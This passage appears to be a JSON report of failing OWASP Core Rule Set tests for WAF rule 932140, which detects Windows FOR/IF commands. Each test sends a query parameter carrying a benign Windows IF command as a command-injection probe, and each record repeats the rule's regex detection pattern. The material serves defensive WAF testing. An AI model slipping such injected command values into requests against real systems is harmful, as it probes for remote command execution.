          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 83,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 83,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF++++++++2++++++++++++GEQ+15++++echo+%22bigger%22",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 84,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=932240 - Remote Command Execution: Unix Command Injection evasion attempt detected", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 84,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF++++++++%222%22++++++++++GEQ+%2215%22++echo+%22bigger%22",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 85,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 85,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF++++++++%25ERRORLEVEL%25+EQU+2+++++goto+sub_problem2",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 86,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 86,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF++++++++%25ERRORLEVEL%25+NEQ+0+++++echo+test",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 87,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 87,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF++++++++%25ERRORLEVEL%25+LEQ+2+++++echo+test",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
